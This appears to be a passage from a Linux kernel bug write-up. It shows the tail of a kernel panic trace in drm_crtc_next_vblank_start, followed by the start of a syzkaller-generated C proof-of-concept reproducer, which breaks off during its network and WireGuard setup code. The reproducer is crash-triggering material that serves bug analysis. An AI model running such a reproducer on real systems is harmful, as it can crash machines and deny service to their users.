[   79.520178][    T9]  ? bus_for_each_dev+0x1c0/0x1c0
[   79.525223][    T9]  ? _raw_spin_unlock_irqrestore+0x54/0x70
[   79.531059][    T9]  ? lockdep_hardirqs_on+0x7d/0x100
[   79.536278][    T9]  ? _raw_spin_unlock_irqrestore+0x41/0x70
[   79.542138][    T9]  __device_attach+0x1e4/0x4b0
[   79.546994][    T9]  ? device_driver_attach+0x210/0x210
[   79.552433][    T9]  ? do_raw_spin_unlock+0x175/0x230
[   79.557695][    T9]  bus_probe_device+0x17c/0x1c0
[   79.562581][    T9]  device_add+0x11c4/0x1c50
[   79.567135][    T9]  ? __fw_devlink_link_to_consumers.isra.0+0x270/0x270
[   79.574005][    T9]  ? mark_held_locks+0x9f/0xe0
[   79.578803][    T9]  ? _raw_spin_unlock_irqrestore+0x54/0x70
[   79.584641][    T9]  usb_set_configuration+0x10ee/0x1af0
[   79.590131][    T9]  usb_generic_driver_probe+0xcf/0x130
[   79.595626][    T9]  usb_probe_device+0xd8/0x2c0
[   79.600416][    T9]  ? usb_driver_release_interface+0x190/0x190
[   79.606506][    T9]  really_probe+0x240/0xca0
[   79.611035][    T9]  __driver_probe_device+0x1df/0x4d0
[   79.616355][    T9]  driver_probe_device+0x4c/0x1a0
[   79.621410][    T9]  __device_attach_driver+0x1d4/0x2e0
[   79.626810][    T9]  bus_for_each_drv+0x149/0x1d0
[   79.631685][    T9]  ? driver_probe_device+0x1a0/0x1a0
[   79.636997][    T9]  ? bus_for_each_dev+0x1c0/0x1c0
[   79.642139][    T9]  ? _raw_spin_unlock_irqrestore+0x54/0x70
[   79.647971][    T9]  ? lockdep_hardirqs_on+0x7d/0x100
[   79.653360][    T9]  ? _raw_spin_unlock_irqrestore+0x41/0x70
[   79.659192][    T9]  __device_attach+0x1e4/0x4b0
[   79.664004][    T9]  ? device_driver_attach+0x210/0x210
[   79.669405][    T9]  ? do_raw_spin_unlock+0x175/0x230
[   79.674639][    T9]  bus_probe_device+0x17c/0x1c0
[   79.679778][    T9]  device_add+0x11c4/0x1c50
[   79.684305][    T9]  ? __fw_devlink_link_to_consumers.isra.0+0x270/0x270
[   79.691180][    T9]  ? usb_detect_static_quirks+0x305/0x3b0
[   79.696936][    T9]  ? mark_held_locks+0x9f/0xe0
[   79.701731][    T9]  usb_new_device+0xcb2/0x19d0
[   79.706542][    T9]  ? hub_disconnect+0x510/0x510
[   79.711432][    T9]  ? _raw_spin_unlock_irq+0x23/0x50
[   79.716662][    T9]  hub_event+0x2d9e/0x4e40
[   79.721125][    T9]  ? hub_port_debounce+0x3b0/0x3b0
[   79.726269][    T9]  ? lock_sync+0x190/0x190
[   79.730719][    T9]  ? rcu_is_watching+0x12/0xb0
[   79.735518][    T9]  ? trace_lock_acquire+0x12d/0x180
[   79.740740][    T9]  ? process_one_work+0x8b7/0x15e0
[   79.745881][    T9]  ? lock_acquire+0x32/0xc0
[   79.750411][    T9]  ? process_one_work+0x8b7/0x15e0
[   79.755553][    T9]  process_one_work+0x99a/0x15e0
[   79.760523][    T9]  ? pwq_dec_nr_in_flight+0x2a0/0x2a0
[   79.765923][    T9]  ? rcu_is_watching+0x12/0xb0
[   79.771017][    T9]  ? spin_bug+0x1c0/0x1c0
[   79.775379][    T9]  ? lock_acquire+0x32/0xc0
[   79.779919][    T9]  ? worker_thread+0x16d/0x10c0
[   79.784800][    T9]  worker_thread+0x67d/0x10c0
[   79.789512][    T9]  ? process_one_work+0x15e0/0x15e0
[   79.794743][    T9]  kthread+0x33e/0x440
[   79.798833][    T9]  ? kthread_complete_and_exit+0x40/0x40
[   79.804489][    T9]  ret_from_fork+0x1f/0x30
[   79.808943][    T9]  </TASK>
[   79.811968][    T9] Modules linked in:
[   79.818794][    T9] ---[ end trace 0000000000000000 ]---
[   79.826339][    T9] RIP: 0010:drm_crtc_next_vblank_start+0xb3/0x2b0
[   79.832893][    T9] Code: e8 01 00 00 48 69 db 38 02 00 00 48 b8 00 00 00 00 00 fc ff df 49 03 9d 38 03 00 00 4c 8d ab 44 01 00 00 4c 89 ea 48 c1 ea 03 <0f> b6 14 02 4c 89 e8 83 e0 07 83 c0 03 38 d0 7c 08 84 d2 0f 85 67
[   79.852634][    T9] RSP: 0018:ffffc900000e6bb0 EFLAGS: 00010207
[   79.858765][    T9] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000000
[   79.866753][    T9] RDX: 0000000000000028 RSI: ffffffff849f2afb RDI: ffff888079558338
[   79.874775][    T9] RBP: ffffc900000e6c48 R08: 0000000000000005 R09: 0000000000000000
[   79.882930][    T9] R10: 0000000000000001 R11: 0000000000000010 R12: ffff8880795590d8
[   79.891001][    T9] R13: 0000000000000144 R14: ffff8880795590d8 R15: dffffc0000000000
[   79.899053][    T9] FS:  0000000000000000(0000) GS:ffff8880b9800000(0000) knlGS:0000000000000000
[   79.908092][    T9] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   79.914698][    T9] CR2: 00007f17191c7688 CR3: 000000002b398000 CR4: 00000000003506f0
[   79.922755][    T9] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[   79.930786][    T9] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[   79.938990][    T9] Kernel panic - not syncing: Fatal exception
[   79.945279][    T9] Kernel Offset: disabled
[   79.949614][    T9] Rebooting in 86400 seconds..
```

## POC

```cpp
// https://syzkaller.appspot.com/bug?id=56e9aec9bc3b5378c9b231a3f4b3329cf9f80990
// autogenerated by syzkaller (https://github.com/google/syzkaller)

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <sched.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mount.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#include <linux/capability.h>
#include <linux/genetlink.h>
#include <linux/if_addr.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/in6.h>
#include <linux/ip.h>
#include <linux/neighbour.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/tcp.h>
#include <linux/usb/ch9.h>
#include <linux/veth.h>

static unsigned long long procid;

static void sleep_ms(uint64_t ms)
{
  usleep(ms * 1000);
}

static bool write_file(const char* file, const char* what, ...)
{
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}

struct nlmsg {
  char* pos;
  int nesting;
  struct nlattr* nested[8];
  char buf[4096];
};


//  netlink_*   函数：使用netlink接口与Linux内核通信，用于配置网络设备
static void netlink_init(struct nlmsg* nlmsg, int typ, int flags,
                         const void* data, int size)
{
  memset(nlmsg, 0, sizeof(*nlmsg));
  struct nlmsghdr* hdr = (struct nlmsghdr*)nlmsg->buf;
  hdr->nlmsg_type = typ;
  hdr->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK | flags;
  memcpy(hdr + 1, data, size);
  nlmsg->pos = (char*)(hdr + 1) + NLMSG_ALIGN(size);
}

static void netlink_attr(struct nlmsg* nlmsg, int typ, const void* data,
                         int size)
{
  struct nlattr* attr = (struct nlattr*)nlmsg->pos;
  attr->nla_len = sizeof(*attr) + size;
  attr->nla_type = typ;
  if (size > 0)
    memcpy(attr + 1, data, size);
  nlmsg->pos += NLMSG_ALIGN(attr->nla_len);
}

static void netlink_nest(struct nlmsg* nlmsg, int typ)
{
  struct nlattr* attr = (struct nlattr*)nlmsg->pos;
  attr->nla_type = typ;
  nlmsg->pos += sizeof(*attr);
  nlmsg->nested[nlmsg->nesting++] = attr;
}

static void netlink_done(struct nlmsg* nlmsg)
{
  struct nlattr* attr = nlmsg->nested[--nlmsg->nesting];
  attr->nla_len = nlmsg->pos - (char*)attr;
}

static int netlink_send_ext(struct nlmsg* nlmsg, int sock, uint16_t reply_type,
                            int* reply_len, bool dofail)
{
  if (nlmsg->pos > nlmsg->buf + sizeof(nlmsg->buf) || nlmsg->nesting)
    exit(1);
  struct nlmsghdr* hdr = (struct nlmsghdr*)nlmsg->buf;
  hdr->nlmsg_len = nlmsg->pos - nlmsg->buf;
  struct sockaddr_nl addr;
  memset(&addr, 0, sizeof(addr));
  addr.nl_family = AF_NETLINK;
  ssize_t n = sendto(sock, nlmsg->buf, hdr->nlmsg_len, 0,
                     (struct sockaddr*)&addr, sizeof(addr));
  if (n != (ssize_t)hdr->nlmsg_len) {
    if (dofail)
      exit(1);
    return -1;
  }
  n = recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
  if (reply_len)
    *reply_len = 0;
  if (n < 0) {
    if (dofail)
      exit(1);
    return -1;
  }
  if (n < (ssize_t)sizeof(struct nlmsghdr)) {
    errno = EINVAL;
    if (dofail)
      exit(1);
    return -1;
  }
  if (hdr->nlmsg_type == NLMSG_DONE)
    return 0;
  if (reply_len && hdr->nlmsg_type == reply_type) {
    *reply_len = n;
    return 0;
  }
  if (n < (ssize_t)(sizeof(struct nlmsghdr) + sizeof(struct nlmsgerr))) {
    errno = EINVAL;
    if (dofail)
      exit(1);
    return -1;
  }
  if (hdr->nlmsg_type != NLMSG_ERROR) {
    errno = EINVAL;
    if (dofail)
      exit(1);
    return -1;
  }
  errno = -((struct nlmsgerr*)(hdr + 1))->error;
  return -errno;
}

static int netlink_send(struct nlmsg* nlmsg, int sock)
{
  return netlink_send_ext(nlmsg, sock, 0, NULL, true);
}

static int netlink_query_family_id(struct nlmsg* nlmsg, int sock,
                                   const char* family_name, bool dofail)
{
  struct genlmsghdr genlhdr;
  memset(&genlhdr, 0, sizeof(genlhdr));
  genlhdr.cmd = CTRL_CMD_GETFAMILY;
  netlink_init(nlmsg, GENL_ID_CTRL, 0, &genlhdr, sizeof(genlhdr));
  netlink_attr(nlmsg, CTRL_ATTR_FAMILY_NAME, family_name,
               strnlen(family_name, GENL_NAMSIZ - 1) + 1);
  int n = 0;
  int err = netlink_send_ext(nlmsg, sock, GENL_ID_CTRL, &n, dofail);
  if (err < 0) {
    return -1;
  }
  uint16_t id = 0;
  struct nlattr* attr = (struct nlattr*)(nlmsg->buf + NLMSG_HDRLEN +
                                         NLMSG_ALIGN(sizeof(genlhdr)));
  for (; (char*)attr < nlmsg->buf + n;
       attr = (struct nlattr*)((char*)attr + NLMSG_ALIGN(attr->nla_len))) {
    if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
      id = *(uint16_t*)(attr + 1);
      break;
    }
  }
  if (!id) {
    errno = EINVAL;
    return -1;
  }
  recv(sock, nlmsg->buf, sizeof(nlmsg->buf), 0);
  return id;
}

static int netlink_next_msg(struct nlmsg* nlmsg, unsigned int offset,
                            unsigned int total_len)
{
  struct nlmsghdr* hdr = (struct nlmsghdr*)(nlmsg->buf + offset);
  if (offset == total_len || offset + hdr->nlmsg_len > total_len)
    return -1;
  return hdr->nlmsg_len;
}

static void netlink_add_device_impl(struct nlmsg* nlmsg, const char* type,
                                    const char* name, bool up)
{
  struct ifinfomsg hdr;
  memset(&hdr, 0, sizeof(hdr));
  if (up)
    hdr.ifi_flags = hdr.ifi_change = IFF_UP;
  netlink_init(nlmsg, RTM_NEWLINK, NLM_F_EXCL | NLM_F_CREATE, &hdr,
               sizeof(hdr));
  if (name)
    netlink_attr(nlmsg, IFLA_IFNAME, name, strlen(name));
  netlink_nest(nlmsg, IFLA_LINKINFO);
  netlink_attr(nlmsg, IFLA_INFO_KIND, type, strlen(type));
}

static void netlink_add_device(struct nlmsg* nlmsg, int sock, const char* type,
                               const char* name)
{
  netlink_add_device_impl(nlmsg, type, name, false);
  netlink_done(nlmsg);
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static void netlink_add_veth(struct nlmsg* nlmsg, int sock, const char* name,
                             const char* peer)
{
  netlink_add_device_impl(nlmsg, "veth", name, false);
  netlink_nest(nlmsg, IFLA_INFO_DATA);
  netlink_nest(nlmsg, VETH_INFO_PEER);
  nlmsg->pos += sizeof(struct ifinfomsg);
  netlink_attr(nlmsg, IFLA_IFNAME, peer, strlen(peer));
  netlink_done(nlmsg);
  netlink_done(nlmsg);
  netlink_done(nlmsg);
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static void netlink_add_xfrm(struct nlmsg* nlmsg, int sock, const char* name)
{
  netlink_add_device_impl(nlmsg, "xfrm", name, true);
  netlink_nest(nlmsg, IFLA_INFO_DATA);
  int if_id = 1;
  netlink_attr(nlmsg, 2, &if_id, sizeof(if_id));
  netlink_done(nlmsg);
  netlink_done(nlmsg);
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static void netlink_add_hsr(struct nlmsg* nlmsg, int sock, const char* name,
                            const char* slave1, const char* slave2)
{
  netlink_add_device_impl(nlmsg, "hsr", name, false);
  netlink_nest(nlmsg, IFLA_INFO_DATA);
  int ifindex1 = if_nametoindex(slave1);
  netlink_attr(nlmsg, IFLA_HSR_SLAVE1, &ifindex1, sizeof(ifindex1));
  int ifindex2 = if_nametoindex(slave2);
  netlink_attr(nlmsg, IFLA_HSR_SLAVE2, &ifindex2, sizeof(ifindex2));
  netlink_done(nlmsg);
  netlink_done(nlmsg);
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static void netlink_add_linked(struct nlmsg* nlmsg, int sock, const char* type,
                               const char* name, const char* link)
{
  netlink_add_device_impl(nlmsg, type, name, false);
  netlink_done(nlmsg);
  int ifindex = if_nametoindex(link);
  netlink_attr(nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static void netlink_add_vlan(struct nlmsg* nlmsg, int sock, const char* name,
                             const char* link, uint16_t id, uint16_t proto)
{
  netlink_add_device_impl(nlmsg, "vlan", name, false);
  netlink_nest(nlmsg, IFLA_INFO_DATA);
  netlink_attr(nlmsg, IFLA_VLAN_ID, &id, sizeof(id));
  netlink_attr(nlmsg, IFLA_VLAN_PROTOCOL, &proto, sizeof(proto));
  netlink_done(nlmsg);
  netlink_done(nlmsg);
  int ifindex = if_nametoindex(link);
  netlink_attr(nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static void netlink_add_macvlan(struct nlmsg* nlmsg, int sock, const char* name,
                                const char* link)
{
  netlink_add_device_impl(nlmsg, "macvlan", name, false);
  netlink_nest(nlmsg, IFLA_INFO_DATA);
  uint32_t mode = MACVLAN_MODE_BRIDGE;
  netlink_attr(nlmsg, IFLA_MACVLAN_MODE, &mode, sizeof(mode));
  netlink_done(nlmsg);
  netlink_done(nlmsg);
  int ifindex = if_nametoindex(link);
  netlink_attr(nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static void netlink_add_geneve(struct nlmsg* nlmsg, int sock, const char* name,
                               uint32_t vni, struct in_addr* addr4,
                               struct in6_addr* addr6)
{
  netlink_add_device_impl(nlmsg, "geneve", name, false);
  netlink_nest(nlmsg, IFLA_INFO_DATA);
  netlink_attr(nlmsg, IFLA_GENEVE_ID, &vni, sizeof(vni));
  if (addr4)
    netlink_attr(nlmsg, IFLA_GENEVE_REMOTE, addr4, sizeof(*addr4));
  if (addr6)
    netlink_attr(nlmsg, IFLA_GENEVE_REMOTE6, addr6, sizeof(*addr6));
  netlink_done(nlmsg);
  netlink_done(nlmsg);
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

#define IFLA_IPVLAN_FLAGS 2
#define IPVLAN_MODE_L3S 2
#undef IPVLAN_F_VEPA
#define IPVLAN_F_VEPA 2

static void netlink_add_ipvlan(struct nlmsg* nlmsg, int sock, const char* name,
                               const char* link, uint16_t mode, uint16_t flags)
{
  netlink_add_device_impl(nlmsg, "ipvlan", name, false);
  netlink_nest(nlmsg, IFLA_INFO_DATA);
  netlink_attr(nlmsg, IFLA_IPVLAN_MODE, &mode, sizeof(mode));
  netlink_attr(nlmsg, IFLA_IPVLAN_FLAGS, &flags, sizeof(flags));
  netlink_done(nlmsg);
  netlink_done(nlmsg);
  int ifindex = if_nametoindex(link);
  netlink_attr(nlmsg, IFLA_LINK, &ifindex, sizeof(ifindex));
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static void netlink_device_change(struct nlmsg* nlmsg, int sock,
                                  const char* name, bool up, const char* master,
                                  const void* mac, int macsize,
                                  const char* new_name)
{
  struct ifinfomsg hdr;
  memset(&hdr, 0, sizeof(hdr));
  if (up)
    hdr.ifi_flags = hdr.ifi_change = IFF_UP;
  hdr.ifi_index = if_nametoindex(name);
  netlink_init(nlmsg, RTM_NEWLINK, 0, &hdr, sizeof(hdr));
  if (new_name)
    netlink_attr(nlmsg, IFLA_IFNAME, new_name, strlen(new_name));
  if (master) {
    int ifindex = if_nametoindex(master);
    netlink_attr(nlmsg, IFLA_MASTER, &ifindex, sizeof(ifindex));
  }
  if (macsize)
    netlink_attr(nlmsg, IFLA_ADDRESS, mac, macsize);
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static int netlink_add_addr(struct nlmsg* nlmsg, int sock, const char* dev,
                            const void* addr, int addrsize)
{
  struct ifaddrmsg hdr;
  memset(&hdr, 0, sizeof(hdr));
  hdr.ifa_family = addrsize == 4 ? AF_INET : AF_INET6;
  hdr.ifa_prefixlen = addrsize == 4 ? 24 : 120;
  hdr.ifa_scope = RT_SCOPE_UNIVERSE;
  hdr.ifa_index = if_nametoindex(dev);
  netlink_init(nlmsg, RTM_NEWADDR, NLM_F_CREATE | NLM_F_REPLACE, &hdr,
               sizeof(hdr));
  netlink_attr(nlmsg, IFA_LOCAL, addr, addrsize);
  netlink_attr(nlmsg, IFA_ADDRESS, addr, addrsize);
  return netlink_send(nlmsg, sock);
}

static void netlink_add_addr4(struct nlmsg* nlmsg, int sock, const char* dev,
                              const char* addr)
{
  struct in_addr in_addr;
  inet_pton(AF_INET, addr, &in_addr);
  int err = netlink_add_addr(nlmsg, sock, dev, &in_addr, sizeof(in_addr));
  if (err < 0) {
  }
}

static void netlink_add_addr6(struct nlmsg* nlmsg, int sock, const char* dev,
                              const char* addr)
{
  struct in6_addr in6_addr;
  inet_pton(AF_INET6, addr, &in6_addr);
  int err = netlink_add_addr(nlmsg, sock, dev, &in6_addr, sizeof(in6_addr));
  if (err < 0) {
  }
}

static void netlink_add_neigh(struct nlmsg* nlmsg, int sock, const char* name,
                              const void* addr, int addrsize, const void* mac,
                              int macsize)
{
  struct ndmsg hdr;
  memset(&hdr, 0, sizeof(hdr));
  hdr.ndm_family = addrsize == 4 ? AF_INET : AF_INET6;
  hdr.ndm_ifindex = if_nametoindex(name);
  hdr.ndm_state = NUD_PERMANENT;
  netlink_init(nlmsg, RTM_NEWNEIGH, NLM_F_EXCL | NLM_F_CREATE, &hdr,
               sizeof(hdr));
  netlink_attr(nlmsg, NDA_DST, addr, addrsize);
  netlink_attr(nlmsg, NDA_LLADDR, mac, macsize);
  int err = netlink_send(nlmsg, sock);
  if (err < 0) {
  }
}

static struct nlmsg nlmsg;

static int tunfd = -1;

#define TUN_IFACE "syz_tun"
#define LOCAL_MAC 0xaaaaaaaaaaaa
#define REMOTE_MAC 0xaaaaaaaaaabb
#define LOCAL_IPV4 "172.20.20.170"
#define REMOTE_IPV4 "172.20.20.187"
#define LOCAL_IPV6 "fe80::aa"
#define REMOTE_IPV6 "fe80::bb"

#define IFF_NAPI 0x0010

// 初始化一个TUN设备，用于模拟网络接口
static void initialize_tun(void)
{
  tunfd = open("/dev/net/tun", O_RDWR | O_NONBLOCK);
  if (tunfd == -1) {
    printf("tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\n");
    printf("otherwise fuzzing or reproducing might not work as intended\n");
    return;
  }
  const int kTunFd = 200;
  if (dup2(tunfd, kTunFd) < 0)
    exit(1);
  close(tunfd);
  tunfd = kTunFd;
  struct ifreq ifr;
  memset(&ifr, 0, sizeof(ifr));
  strncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);
  ifr.ifr_flags = IFF_TAP | IFF_NO_PI;
  if (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {
    exit(1);
  }
  char sysctl[64];
  sprintf(sysctl, "/proc/sys/net/ipv6/conf/%s/accept_dad", TUN_IFACE);
  write_file(sysctl, "0");
  sprintf(sysctl, "/proc/sys/net/ipv6/conf/%s/router_solicitations", TUN_IFACE);
  write_file(sysctl, "0");
  int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  if (sock == -1)
    exit(1);
  netlink_add_addr4(&nlmsg, sock, TUN_IFACE, LOCAL_IPV4);
  netlink_add_addr6(&nlmsg, sock, TUN_IFACE, LOCAL_IPV6);
  uint64_t macaddr = REMOTE_MAC;
  struct in_addr in_addr;
  inet_pton(AF_INET, REMOTE_IPV4, &in_addr);
  netlink_add_neigh(&nlmsg, sock, TUN_IFACE, &in_addr, sizeof(in_addr),
                    &macaddr, ETH_ALEN);
  struct in6_addr in6_addr;
  inet_pton(AF_INET6, REMOTE_IPV6, &in6_addr);
  netlink_add_neigh(&nlmsg, sock, TUN_IFACE, &in6_addr, sizeof(in6_addr),
                    &macaddr, ETH_ALEN);
  macaddr = LOCAL_MAC;
  netlink_device_change(&nlmsg, sock, TUN_IFACE, true, 0, &macaddr, ETH_ALEN,
                        NULL);
  close(sock);
}

#define DEVLINK_FAMILY_NAME "devlink"

#define DEVLINK_CMD_PORT_GET 5
#define DEVLINK_ATTR_BUS_NAME 1
#define DEVLINK_ATTR_DEV_NAME 2
#define DEVLINK_ATTR_NETDEV_NAME 7

static struct nlmsg nlmsg2;

static void initialize_devlink_ports(const char* bus_name, const char* dev_name,
                                     const char* netdev_prefix)
{
  struct genlmsghdr genlhdr;
  int len, total_len, id, err, offset;
  uint16_t netdev_index;
  int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
  if (sock == -1)
    exit(1);
  int rtsock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
  if (rtsock == -1)
    exit(1);
  id = netlink_query_family_id(&nlmsg, sock, DEVLINK_FAMILY_NAME, true);
  if (id == -1)
    goto error;
  memset(&genlhdr, 0, sizeof(genlhdr));
  genlhdr.cmd = DEVLINK_CMD_PORT_GET;
  netlink_init(&nlmsg, id, NLM_F_DUMP, &genlhdr, sizeof(genlhdr));
  netlink_attr(&nlmsg, DEVLINK_ATTR_BUS_NAME, bus_name, strlen(bus_name) + 1);
  netlink_attr(&nlmsg, DEVLINK_ATTR_DEV_NAME, dev_name, strlen(dev_name) + 1);
  err = netlink_send_ext(&nlmsg, sock, id, &total_len, true);
  if (err < 0) {
    goto error;
  }
  offset = 0;
  netdev_index = 0;
  while ((len = netlink_next_msg(&nlmsg, offset, total_len)) != -1) {
    struct nlattr* attr = (struct nlattr*)(nlmsg.buf + offset + NLMSG_HDRLEN +
                                           NLMSG_ALIGN(sizeof(genlhdr)));
    for (; (char*)attr < nlmsg.buf + offset + len;
         attr = (struct nlattr*)((char*)attr + NLMSG_ALIGN(attr->nla_len))) {
      if (attr->nla_type == DEVLINK_ATTR_NETDEV_NAME) {
        char* port_name;
        char netdev_name[IFNAMSIZ];
        port_name = (char*)(attr + 1);
        snprintf(netdev_name, sizeof(netdev_name), "%s%d", netdev_prefix,
                 netdev_index);
        netlink_device_change(&nlmsg2, rtsock, port_name, true, 0, 0, 0,
                              netdev_name);
        break;
      }
    }
    offset += len;
    netdev_index++;
  }
error:
  close(rtsock);
  close(sock);
}

#define DEV_IPV4 "172.20.20.%d"
#define DEV_IPV6 "fe80::%02x"
#define DEV_MAC 0x00aaaaaaaaaa

static void netdevsim_add(unsigned int addr, unsigned int port_count)
{
  write_file("/sys/bus/netdevsim/del_device", "%u", addr);
  if (write_file("/sys/bus/netdevsim/new_device", "%u %u", addr, port_count)) {
    char buf[32];
    snprintf(buf, sizeof(buf), "netdevsim%d", addr);
    initialize_devlink_ports("netdevsim", buf, "netdevsim");
  }
}

#define WG_GENL_NAME "wireguard"
enum wg_cmd {
  WG_CMD_GET_DEVICE,
  WG_CMD_SET_DEVICE,
};
enum wgdevice_attribute {
  WGDEVICE_A_UNSPEC,
  WGDEVICE_A_IFINDEX,
  WGDEVICE_A_IFNAME,
  WGDEVICE_A_PRIVATE_KEY,
  WGDEVICE_A_PUBLIC_KEY,
  WGDEVICE_A_FLAGS,
  WGDEVICE_A_LISTEN_PORT,
  WGDEVICE_A_FWMARK,
  WGDEVICE_A_PEERS,
};
enum wgpeer_attribute {
  WGPEER_A_UNSPEC,
  WGPEER_A_PUBLIC_KEY,
  WGPEER_A_PRESHARED_KEY,
  WGPEER_A_FLAGS,
  WGPEER_A_ENDPOINT,
  WGPEER_A_PERSISTENT_KEEPALIVE_INTERVAL,
  WGPEER_A_LAST_HANDSHAKE_TIME,
  WGPEER_A_RX_BYTES,
  WGPEER_A_TX_BYTES,
  WGPEER_A_ALLOWEDIPS,
  WGPEER_A_PROTOCOL_VERSION,
};
enum wgallowedip_attribute {
  WGALLOWEDIP_A_UNSPEC,
  WGALLOWEDIP_A_FAMILY,
  WGALLOWEDIP_A_IPADDR,
  WGALLOWEDIP_A_CIDR_MASK,
};

static void netlink_wireguard_setup(void)
{
  const char ifname_a[] = "wg0";
  const char ifname_b[] = "wg1";
  const char ifname_c[] = "wg2";
  const char private_a[] =
      "\xa0\x5c\xa8\x4f\x6c\x9c\x8e\x38\x53\xe2\xfd\x7a\x70\xae\x0f\xb2\x0f\xa1"
      "\x52\x60\x0c\xb0\x08\x45\x17\x4f\x08\x07\x6f\x8d\x78\x43";
  const char private_b[] =
      "\xb0\x80\x73\xe8\xd4\x4e\x91\xe3\xda\x92\x2c\x22\x43\x82\x44\xbb\x88\x5c"
      "\x69\xe2\x69\xc8\xe9\xd8\x35\xb1\x14\x29\x3a\x4d\xdc\x6e";
  const char private_c[] =
      "\xa0\xcb\x87\x9a\x47\xf5\xbc\x64\x4c\x0e\x69\x3f\xa6\xd0\x31\xc7\x4a\x15"
      "\x53\xb6\xe9\x01\xb9\xff\x2f\x51\x8c\x78\x04\x2f\xb5\x42";
  const char public_a[] =
      "\x97\x5c\x9d\x81\xc9\x83\xc8\x20\x9e\xe7\x81\x25\x4b\x89\x9f\x8e\xd9\x25"
      "\xae\x9f\x09\x23\xc2\x3c\x62\xf5\x3c\x57\xcd\xbf\x69\x1c";
  const char public_b[] =
      "\xd1\x73\x28\x99\xf6\x11\xcd\x89\x94\x03\x4d\x7f\x41\x3d\xc9\x57\x63\x0e"
      "\x54\x93\xc2\x85\xac\xa4\x00\x65\xcb\x63\x11\xbe\x69\x6b";
  const char public_c[] =
      "\xf4\x4d\xa3\x67\xa8\x8e\xe6\x56\x4f\x02\x02\x11\x45\x67\x27\x08\x2f\x5c"
      "\xeb\xee\x8b\x1b\xf5\xeb\x73\x37\x34\x1b\x45\x9b\x39\x22";
  const uint16_t listen_a = 20001;
  const uint16_t listen_b = 20002;
  const uint16_t listen_c = 20003;
  const uint16_t af_inet = AF_INET;
  const uint16_t af_inet6 = AF_INET6;
  const struct sockaddr_in endpoint_b_v4 = {
      .sin_family = AF_INET,
      .sin_port = htons(listen_b),
      .sin_addr = {htonl(INADDR_LOOPBACK)}};
  const struct sockaddr_in endpoint_c_v4 = {
      .sin_family = AF_INET,
      .sin_port = htons(listen_c),
      .sin_addr = {htonl(INADDR_LOOPBACK)}};
  struct sockaddr_in6 endpoint_a_v6 = {.sin6_family = AF_INET6,
                                       .sin6_port = htons(listen_a)};
  endpoint_a_v6.sin6_addr = in6addr_loopback;
  struct sockaddr_in6 endpoint_c_v6 = {.sin6_family = AF_INET6,
                                       .sin6_port = htons(listen_c)};
  endpoint_c_v6.sin6_addr = in6addr_loopback;
  const struct in_addr first_half_v4 = {0};
  const struct in_addr second_half_v4 = {(uint32_t)htonl(128 << 24)};
  const struct in6_addr first_half_v6 = {{{0}}};
  const struct in6_addr second_half_v6 = {{{0x80}}};
  const uint8_t half_cidr = 1;
  const uint16_t persistent_keepalives[] = {1, 3, 7, 9, 14, 19};
  struct genlmsghdr genlhdr = {.cmd = WG_CMD_SET_DEVICE, .version = 1};
  int sock;
  int id, err;
  sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
  if (sock == -1) {
    return;
  }
  id = netlink_query_family_id(&nlmsg, sock, WG_GENL_NAME, true);
  if (id == -1)
    goto error;
  netlink_init(&nlmsg, id, 0, &genlhdr, sizeof(genlhdr));
  netlink_attr(&nlmsg, WGDEVICE_A_IFNAME, ifname_a, strlen(ifname_a) + 1);
  netlink_attr(&nlmsg, WGDEVICE_A_PRIVATE_KEY, private_a, 32);
  netlink_attr(&nlmsg, WGDEVICE_A_LISTEN_PORT, &listen_a, 2);
  netlink_nest(&nlmsg, NLA_F_NESTED | WGDEVICE_A_PEERS);
  netlink_nest(&nlmsg, NLA_F_NESTED | 0);
  netlink_attr(&nlmsg, WGPEER_A_PUBLIC_KEY, public_b, 32);
